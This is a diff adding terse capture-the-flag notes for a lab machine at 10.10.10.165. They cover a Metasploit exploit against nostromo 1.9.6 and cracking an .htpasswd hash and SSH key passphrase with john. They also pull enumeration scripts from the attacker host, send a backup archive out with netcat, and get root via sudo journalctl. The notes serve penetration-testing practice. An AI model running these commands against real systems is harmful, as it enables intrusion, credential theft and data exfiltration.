@@ -1,0 +1,91 @@
+nmap -sC -sV -oN nmap 10.10.10.165 -v -A
+
+80 and 22 -> website
+
+nmap -> nostromno 1.9.6
+searchsploit nostromo
+nostromo 1.9.6 - Remote Code Execution  | multiple/remote/47837.py
+
+msfconsole -> use exploit with correct RHOSTS / LHOST
+
+-> shell as www-data
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+in /var/nostromo/conf/.htpasswd:
+david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+
+john --wordlist=/usr/share/wordlists/rockyou.txt david
+-> Nowonly4me
+
+cant use it with su david or sudo -l
+
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -> doesnt work
+do it on host
+then python -m SimpleHTTPServer 80
+on remote wget http://10.10.14.34/LinEnum.sh
+
+execute script
+
+-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
+-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
+-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
+
+-> nothing with those and htpasswd cracked already
+
+same thing with linpeas
+cp /opt/privilege-escalation-awesome-scripts-suite/linPEAS/linpeas.sh .
+wget on remote and excute it -> nothing more
+
+back to /var/nostromo/conf -> nhttpd.conf
+something about /home and public_www
+
+-> i can access /home/david/public_wwww -> intersting compressed file
+
+on remote at /home/david/public_www/protected-file-area:
+nc 10.10.14.34 4444 < backup-ssh-identity-files.tgz
+
+on host:
+nc -lvnp 4444 > backup-ssh-identity-files.tgz
+
+-> gives us david home dir with private key
+crack rsa pass with john again:
+
+python /usr/share/john/ssh2john.py id_rsa > david_hash
+john --wordlist=/usr/share/wordlists/rockyou.txt david_hash
+-> pass = hunter
+
+ssh david@10.10.10.165 -i home/david/.ssh/id_rsa with "hunter"
+
+user flag
+7db0b48469606a42cec20750d9782f3d
+
+cant run sudo -l and nothing intersting in suid files
+
+in /home/david/bin there is server-stats.sh:
+
+```
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+```
+
+-> we can use /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+journalctl as sudo
+
+-> gtfobins
+
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service then !/bin/sh
+= root shell
+
+root flag
+9aa36a6d76f785dfd320a478f6e0d906
